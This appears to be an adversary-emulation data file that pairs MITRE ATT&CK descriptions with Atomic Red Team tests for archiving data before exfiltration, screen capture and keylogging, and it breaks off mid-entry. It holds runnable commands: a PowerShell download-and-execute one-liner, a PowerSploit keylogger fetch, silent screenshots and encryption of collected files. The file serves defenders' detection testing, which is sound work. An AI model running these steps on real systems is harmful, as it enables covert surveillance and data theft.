collection:
  T1560.001:
    technique:
      modified: '2023-04-14T19:28:21.394Z'
      name: 'Archive Collected Data: Archive via Utility'
      description: "Adversaries may use utilities to compress and/or encrypt collected
        data prior to exfiltration. Many utilities include functionalities to compress,
        encrypt, or otherwise package data into a format that is easier/more secure
        to transport.\n\nAdversaries may abuse various utilities to compress or encrypt
        data before exfiltration. Some third party utilities may be preinstalled,
        such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows
        systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may
        be used to package collected files into a cabinet (.cab) file. <code>diantz</code>
        may also be used to download and compress files from remote locations (i.e.
        [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation:
        diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories
        with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160)
        to Base64 encode collected data before exfiltration. \n\nAdversaries may use
        also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform
        similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation:
        WinZip Homepage)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_contributors:
      - Mayan Arora aka Mayan Mohan
      - Mark Wee
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

        Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'File: File Creation'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662
      created: '2020-02-20T21:01:25.428Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1560/001
        external_id: T1560.001
      - source_name: WinRAR Homepage
        description: A. Roshal. (2020). RARLAB. Retrieved February 20, 2020.
        url: https://www.rarlab.com/
      - source_name: WinZip Homepage
        description: Corel Corporation. (2020). WinZip. Retrieved February 20, 2020.
        url: https://www.winzip.com/win/en/
      - source_name: 7zip Homepage
        description: I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020.
        url: https://www.7-zip.org/
      - source_name: diantz.exe_lolbas
        description: Living Off The Land Binaries, Scripts and Libraries (LOLBAS).
          (n.d.). Diantz.exe. Retrieved October 25, 2021.
        url: https://lolbas-project.github.io/lolbas/Binaries/Diantz/
      - source_name: Wikipedia File Header Signatures
        description: Wikipedia. (2016, March 31). List of file signatures. Retrieved
          April 22, 2016.
        url: https://en.wikipedia.org/wiki/List_of_file_signatures
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1560.001
    atomic_tests:
    - name: Compress Data for Exfiltration With Rar
      auto_generated_guid: 02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0
      description: "An adversary may compress data (e.g., sensitive documents) that
        is collected prior to exfiltration.\nWhen the test completes you should find
        the txt files from the %USERPROFILE% directory compressed in a file called
        T1560.001-data.rar in the %USERPROFILE% directory \n"
      supported_platforms:
      - windows
      input_arguments:
        input_path:
          description: Path that should be compressed into our output file
          type: path
          default: "%USERPROFILE%"
        file_extension:
          description: Extension of files to compress
          type: string
          default: ".txt"
        output_file:
          description: Path where resulting compressed data should be placed
          type: path
          default: "%USERPROFILE%\\T1560.001-data.rar"
        rar_installer:
          description: Winrar installer
          type: path
          default: "%TEMP%\\winrar.exe"
        rar_exe:
          description: The RAR executable from Winrar
          type: path
          default: "%programfiles%/WinRAR/Rar.exe"
      dependencies:
      - description: 'Rar tool must be installed at specified location (#{rar_exe})

          '
        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)

          '
        get_prereq_command: |
          echo Downloading Winrar installer
          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
          #{rar_installer} /S
      executor:
        name: command_prompt
        elevation_required: false
        command: '"#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}

          '
        cleanup_command: 'del /f /q /s #{output_file} >nul 2>&1

          '
    - name: Compress Data and lock with password for Exfiltration with winrar
      auto_generated_guid: 8dd61a55-44c6-43cc-af0c-8bdda276860c
      description: |
        Note: Requires winrar installation
        rar a -p"blue" hello.rar (VARIANT)
      supported_platforms:
      - windows
      input_arguments:
        rar_installer:
          description: Winrar installer
          type: path
          default: "%TEMP%\\winrar.exe"
        rar_exe:
          description: The RAR executable from Winrar
          type: path
          default: "%programfiles%/WinRAR/Rar.exe"
      dependencies:
      - description: 'Rar tool must be installed at specified location (#{rar_exe})

          '
        prereq_command: 'if not exist "#{rar_exe}" (exit /b 1)

          '
        get_prereq_command: |
          echo Downloading Winrar installer
          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe" #{rar_installer}
          #{rar_installer} /S
      executor:
        name: command_prompt
        elevation_required: false
        command: |
          mkdir .\tmp\victim-files
          cd .\tmp\victim-files
          echo "This file will be encrypted" > .\encrypted_file.txt
          "#{rar_exe}" a -hp"blue" hello.rar
          dir
    - name: Compress Data and lock with password for Exfiltration with winzip
      auto_generated_guid: 01df0353-d531-408d-a0c5-3161bf822134
      description: |
        Note: Requires winzip installation
        wzzip sample.zip -s"blueblue" *.txt (VARIANT)
      supported_platforms:
      - windows
      input_arguments:
        winzip_exe:
          description: Path to installed Winzip executable
          type: path
          default: "%ProgramFiles%\\WinZip\\winzip64.exe"
        winzip_url:
          description: Path to download Windows Credential Editor zip file
          type: url
          default: https://download.winzip.com/gl/nkln/winzip24-home.exe
        winzip_hash:
          description: File hash of the Windows Credential Editor zip file
          type: string
          default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
      dependency_executor_name: powershell
      dependencies:
      - description: 'Winzip must be installed

          '
        prereq_command: 'cmd /c ''if not exist "#{winzip_exe}" (echo 1) else (echo
          0)''

          '
        get_prereq_command: |
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
            Write-Host Follow the installation prompts to continue
            cmd /c "$env:Temp\winzip.exe"
          }
      executor:
        name: command_prompt
        elevation_required: false
        command: |
          path=%path%;"C:\Program Files (x86)\winzip"
          mkdir .\tmp\victim-files
          cd .\tmp\victim-files
          echo "This file will be encrypted" > .\encrypted_file.txt
          "#{winzip_exe}" -min -a -s"hello" archive.zip *
          dir
    - name: Compress Data and lock with password for Exfiltration with 7zip
      auto_generated_guid: d1334303-59cb-4a03-8313-b3e24d02c198
      description: 'Note: Requires 7zip installation

        '
      supported_platforms:
      - windows
      input_arguments:
        7zip_installer:
          description: 7zip installer
          type: path
          default: "%TEMP%\\7zip.exe"
        7zip_exe:
          description: Path to installed 7zip executable
          type: path
          default: "%ProgramFiles%\\7-zip\\7z.exe"
      dependencies:
      - description: '7zip tool must be installed at specified location (#{7zip_exe})

          '
        prereq_command: 'if not exist "#{7zip_exe}" (exit /b 1)

          '
        get_prereq_command: |
          echo Downloading 7-zip installer
          bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2002-x64.exe" #{7zip_installer}
          #{7zip_installer} /S
      executor:
        name: command_prompt
        elevation_required: false
        command: |
          mkdir $PathToAtomicsFolder\T1560.001\victim-files
          cd $PathToAtomicsFolder\T1560.001\victim-files
          echo "This file will be encrypted" > .\encrypted_file.txt
          "#{7zip_exe}" u archive.7z *txt -pblue
          dir
    - name: Data Compressed - nix - zip
      auto_generated_guid: c51cec55-28dd-4ad2-9461-1eacbc82c3a0
      description: 'An adversary may compress data (e.g., sensitive documents) that
        is collected prior to exfiltration. This test uses standard zip compression.

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        input_files:
          description: Path that should be compressed into our output file, may include
            wildcards
          type: path
          default: "/var/log/{w,b}tmp"
        output_file:
          description: Path that should be output as a zip archive
          type: path
          default: "$HOME/data.zip"
      dependencies:
      - description: 'Files to zip must exist (#{input_files})

          '
        prereq_command: 'if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip)
          ] ; then exit 0; else exit 1; fi;

          '
        get_prereq_command: |
          (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
          echo Please set input_files argument to include files that exist
      executor:
        name: sh
        elevation_required: false
        command: 'zip #{output_file} #{input_files}

          '
        cleanup_command: 'rm -f #{output_file}

          '
    - name: Data Compressed - nix - gzip Single File
      auto_generated_guid: cde3c2af-3485-49eb-9c1f-0ed60e9cc0af
      description: 'An adversary may compress data (e.g., sensitive documents) that
        is collected prior to exfiltration. This test uses standard gzip compression.

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        input_file:
          description: Path that should be compressed
          type: path
          default: "$HOME/victim-gzip.txt"
        input_content:
          description: contents of compressed files if file does not already exist.
            default contains test credit card and social security number
          type: string
          default: 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101'
      executor:
        name: sh
        elevation_required: false
        command: 'test -e #{input_file} && gzip -k #{input_file} || (echo ''#{input_content}''
          >> #{input_file}; gzip -k #{input_file})

          '
        cleanup_command: 'rm -f #{input_file}.gz

          '
    - name: Data Compressed - nix - tar Folder or File
      auto_generated_guid: 7af2b51e-ad1c-498c-aca8-d3290c19535a
      description: 'An adversary may compress data (e.g., sensitive documents) that
        is collected prior to exfiltration. This test uses standard gzip compression.

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        input_file_folder:
          description: Path that should be compressed
          type: path
          default: "$HOME/$USERNAME"
        output_file:
          description: File that should be output
          type: path
          default: "$HOME/data.tar.gz"
      dependencies:
      - description: 'Folder to zip must exist (#{input_file_folder})

          '
        prereq_command: 'test -e #{input_file_folder}

          '
        get_prereq_command: 'mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1

          '
      executor:
        name: sh
        elevation_required: false
        command: 'tar -cvzf #{output_file} #{input_file_folder}

          '
        cleanup_command: 'rm -f #{output_file}

          '
    - name: Data Encrypted with zip and gpg symmetric
      auto_generated_guid: '0286eb44-e7ce-41a0-b109-3da516e05a5f'
      description: 'Encrypt data for exiltration

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        test_folder:
          description: Path used to store files.
          type: path
          default: "/tmp/T1560"
        test_file:
          description: Temp file used to store encrypted data.
          type: path
          default: T1560
        encryption_password:
          description: Password used to encrypt data.
          type: string
          default: InsertPasswordHere
      dependency_executor_name: sh
      dependencies:
      - description: gpg and zip are required to run the test.
        prereq_command: 'if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)"
          ]; then exit 1; fi;

          '
        get_prereq_command: "(which yum && yum -y install epel-release zip gpg)||(which
          apt-get && apt-get install -y zip gpg)\n"
      executor:
        name: sh
        elevation_required: false
        command: |
          mkdir -p #{test_folder}
          cd #{test_folder}; touch a b c d e f g
          zip --password "#{encryption_password}" #{test_folder}/#{test_file} ./*
          echo "#{encryption_password}" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
          ls -l #{test_folder}
        cleanup_command: 'rm -Rf #{test_folder}

          '
    - name: Encrypts collected data with AES-256 and Base64
      auto_generated_guid: a743e3a6-e8b2-4a30-abe7-ca85d201b5d3
      description: "An adversary may compress all the collected data, encrypt and
        send them to a C2 server using base64 encoding. \nThis atomic test tries to
        emulate the behaviour of the FLEXIROOT backdoor to archive the collected data.
        FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer
        the encrypted data to the C2 server. \nIn this test, standard zip compression
        and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/"
      supported_platforms:
      - linux
      - macos
      input_arguments:
        input_folder:
          description: Path to the folder used to store the test files
          type: path
          default: "/tmp/t1560"
        input_file:
          description: Name of the compressed and encrypted files
          type: string
          default: t1560_data
        enc_pass:
          description: Password used to encrypt the data
          type: string
          default: atomic_enc_pass
      dependency_executor_name: bash
      dependencies:
      - description: The folder and test files must exist
        prereq_command: 'if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;'
        get_prereq_command: 'if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder};
          cd #{input_folder}; touch {a..z}.data; fi;'
      executor:
        command: "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl
          enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip
          -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc
          | base64"
        cleanup_command: 'rm -rf #{input_folder}'
        name: bash
        elevation_required: false
  T1113:
    technique:
      modified: '2023-03-30T21:01:39.967Z'
      name: Screen Capture
      description: 'Adversaries may attempt to take screen captures of the desktop
        to gather information over the course of an operation. Screen capturing functionality
        may be included as a feature of a remote access tool used in post-compromise
        operations. Taking a screenshot is also typically possible through native
        utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>,
        or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated
        Mac Malware)

        '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Monitoring for screen capture behavior will depend on the
        method used to obtain data from the operating system and write output files.
        Detection methods could include collecting information from unusual processes
        using API calls used to obtain image data, and monitoring for image files
        written to disk. The sensor data may need to be correlated with other events
        to identify malicious activity, depending on the legitimacy of this behavior
        within a given network environment.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      type: attack-pattern
      id: attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688
      created: '2017-05-31T21:31:25.060Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1113
        external_id: T1113
      - source_name: CopyFromScreen .NET
        description: Microsoft. (n.d.). Graphics.CopyFromScreen Method. Retrieved
          March 24, 2020.
        url: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8
      - source_name: Antiquated Mac Malware
        description: Thomas Reed. (2017, January 18). New Mac backdoor using antiquated
          code. Retrieved July 5, 2017.
        url: https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
      identifier: T1113
    atomic_tests:
    - name: Screencapture
      auto_generated_guid: 0f47ceb1-720f-4275-96b8-21f0562217ac
      description: 'Use screencapture command to collect a full desktop screenshot

        '
      supported_platforms:
      - macos
      input_arguments:
        output_file:
          description: Output file path
          type: path
          default: "/tmp/T1113_desktop.png"
      executor:
        command: 'screencapture #{output_file}

          '
        cleanup_command: 'rm #{output_file}

          '
        name: bash
    - name: Screencapture (silent)
      auto_generated_guid: deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4
      description: 'Use screencapture command to collect a full desktop screenshot

        '
      supported_platforms:
      - macos
      input_arguments:
        output_file:
          description: Output file path
          type: path
          default: "/tmp/T1113_desktop.png"
      executor:
        command: 'screencapture -x #{output_file}

          '
        cleanup_command: 'rm #{output_file}

          '
        name: bash
    - name: X Windows Capture
      auto_generated_guid: 8206dd0c-faf6-4d74-ba13-7fbe13dce6ac
      description: 'Use xwd command to collect a full desktop screenshot and review
        file with xwud

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Output file path
          type: path
          default: "/tmp/T1113_desktop.xwd"
        package_checker:
          description: Package checking command for linux. Debian system command-
            dpkg -s x11-apps
          type: string
          default: rpm -q xorg-x11-apps
        package_installer:
          description: Package installer command for linux. Debian system command-
            apt-get install x11-apps
          type: string
          default: yum install -y xorg-x11-apps
      dependency_executor_name: bash
      dependencies:
      - description: 'Package with XWD and XWUD must exist on device

          '
        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
          1; fi

          '
        get_prereq_command: "sudo #{package_installer} \n"
      executor:
        command: |
          xwd -root -out #{output_file}
          xwud -in #{output_file}
        cleanup_command: 'rm #{output_file}

          '
        name: bash
    - name: Capture Linux Desktop using Import Tool
      auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
      description: 'Use import command from ImageMagick to collect a full desktop
        screenshot

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Output file path
          type: path
          default: "/tmp/T1113_desktop.png"
      dependencies:
      - description: 'ImageMagick must be installed

          '
        prereq_command: 'if import -help > /dev/null 2>&1; then exit 0; else exit
          1; fi

          '
        get_prereq_command: 'sudo apt install graphicsmagick-imagemagick-compat

          '
      executor:
        command: 'import -window root #{output_file}

          '
        cleanup_command: 'rm #{output_file}

          '
        name: bash
    - name: Windows Screencapture
      auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
      description: 'Use Psr.exe binary to collect screenshots of user display. Test
        will do left mouse click to simulate user behaviour

        '
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Output file path
          type: path
          default: c:\temp\T1113_desktop.zip
        recording_time:
          description: Time to take screenshots
          type: integer
          default: 5
      executor:
        name: powershell
        elevation_required: false
        command: |
          cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
          Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
          [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
          cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
        cleanup_command: 'rm #{output_file} -ErrorAction Ignore

          '
    - name: Windows Screen Capture (CopyFromScreen)
      auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
      description: |
        Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.

        [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
      supported_platforms:
      - windows
      input_arguments:
        output_file:
          description: Path where captured results will be placed
          type: path
          default: "$env:TEMP\\T1113.png"
      executor:
        command: |
          Add-Type -AssemblyName System.Windows.Forms
          $screen = [Windows.Forms.SystemInformation]::VirtualScreen
          $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
          $graphic = [Drawing.Graphics]::FromImage($bitmap)
          $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
          $bitmap.Save("#{output_file}")
        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore

          '
        name: powershell
  T1557:
    technique:
      modified: '2023-03-30T21:01:37.568Z'
      name: Adversary-in-the-Middle
      description: |-
        Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)

        For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.(Citation: volexity_0day_sophos_FW) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)

        Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Mayuresh Dani, Qualys
      - Daniil Yugoslavskiy, @yugoslavskiy, Atomic Threat Coverage project
      - NEC
      x_mitre_deprecated: false
      x_mitre_detection: Monitor network traffic for anomalies associated with known
        AiTM behavior. Consider monitoring for modifications to system configuration
        files involved in shaping network traffic flow.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Network
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      - 'Service: Service Creation'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d
      created: '2020-02-11T19:07:12.114Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1557
        external_id: T1557
      - source_name: dns_changer_trojans
        description: Abendan, O. (2012, June 14). How DNS Changer Trojans Direct Users
          to Threats. Retrieved October 28, 2021.
        url: https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/125/how-dns-changer-trojans-direct-users-to-threats
      - source_name: volexity_0day_sophos_FW
        description: 'Adair, S., Lancaster, T., Volexity Threat Research. (2022, June
          15). DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious
          Breach. Retrieved July 1, 2022.'
        url: https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/
      - source_name: taxonomy_downgrade_att_tls
        description: Alashwali, E. S., Rasmussen, K. (2019, January 26). What's in
          a Downgrade? A Taxonomy of Downgrade Attacks in the TLS Protocol and Application
          Protocols Using TLS. Retrieved December 7, 2021.
        url: https://arxiv.org/abs/1809.05681
      - source_name: ad_blocker_with_miner
        description: Kuzmenko, A.. (2021, March 10). Ad blocker with miner included.
          Retrieved October 28, 2021.
        url: https://securelist.com/ad-blocker-with-miner-included/101105/
      - source_name: mitm_tls_downgrade_att
        description: praetorian Editorial Team. (2014, August 19). Man-in-the-Middle
          TLS Protocol Downgrade Attack. Retrieved December 8, 2021.
        url: https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/
      - source_name: Rapid7 MiTM Basics
        description: Rapid7. (n.d.). Man-in-the-Middle (MITM) Attacks. Retrieved March
          2, 2020.
        url: https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/
      - source_name: tlseminar_downgrade_att
        description: Team Cinnamon. (2017, February 3). Downgrade Attacks. Retrieved
          December 9, 2021.
        url: https://tlseminar.github.io/downgrade-attacks/
      - source_name: ttint_rat
        description: 'Tu, L. Ma, Y. Ye, G. (2020, October 1). Ttint: An IoT Remote
          Access Trojan spread through 2 0-day vulnerabilities. Retrieved October
          28, 2021.'
        url: https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1056.001:
    technique:
      modified: '2023-03-30T21:01:37.930Z'
      name: 'Input Capture: Keylogging'
      description: "Adversaries may log user keystrokes to intercept credentials as
        the user types them. Keylogging is likely to be used to acquire credentials
        for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
        efforts are not effective, and may require an adversary to intercept keystrokes
        on a system for a substantial period of time before credentials can be successfully
        captured.\n\nKeylogging is the most prevalent type of input capture, with
        many different ways of intercepting keystrokes.(Citation: Adventures of a
        Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing
        keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004),
        this focuses solely on API functions intended for processing keystroke data.\n*
        Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n*
        Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601)
        may provide adversaries with hooks into the operating system of network devices
        to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device
        Attacks) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Keyloggers may take many forms, possibly involving modification
        to the Registry and installation of a driver, setting a hook, or polling to
        intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`,
        and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry
        and file system for such changes, monitor driver installs, and look for common
        keylogging API calls. API calls alone are not an indicator of keylogging,
        but may provide behavioral data that is useful when combined with other information
        such as new files written to disk and unusual processes.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Network
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Driver: Driver Load'
      x_mitre_permissions_required:
      - Administrator
      - root
      - SYSTEM
      - User
      type: attack-pattern
      id: attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4
      created: '2020-02-11T18:58:11.791Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056/001
        external_id: T1056.001
      - source_name: Adventures of a Keystroke
        description: 'Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth
          look into keyloggers on Windows. Retrieved April 27, 2016.'
        url: http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
      - source_name: Cisco Blog Legacy Device Attacks
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1056.001
    atomic_tests:
    - name: Input Capture
      auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
      description: |
        Utilize PowerShell and external resource to capture keystrokes
        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
        Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

        Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
      supported_platforms:
      - windows
      input_arguments:
        filepath:
          description: Name of the local file, include path.
          type: path
          default: "$env:TEMP\\key.log"
      dependencies:
      - description: 'Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1

          '
        prereq_command: 'if (Test-Path PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1)
          {exit 0} else {exit 1}

          '
        get_prereq_command: "Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1
          -OutFile PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1     \n"
      executor:
        command: "$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath
          #{filepath}\n"
        cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore

          '
        name: powershell
        elevation_required: true
    - name: Living off the land Terminal Input Capture on Linux with pam.d
      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
      description: "Pluggable Access Module, which is present on all modern Linux
        systems, generally contains a library called pam_tty_audit.so which logs all
        keystrokes for the selected users and sends it to audit.log.  All terminal
        activity on any new logins would then be archived and readable by an adversary
        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
        with 'log_passwd' as in this example.  If root logging is enabled, then output
        from any process which is later started by root is also logged, even if this
        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
        'aureport --tty' or other audit.d reading tools to read the log output, which
        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
        \n"
      dependencies:
      - description: 'Checking if pam_tty_audit.so is installed

          '
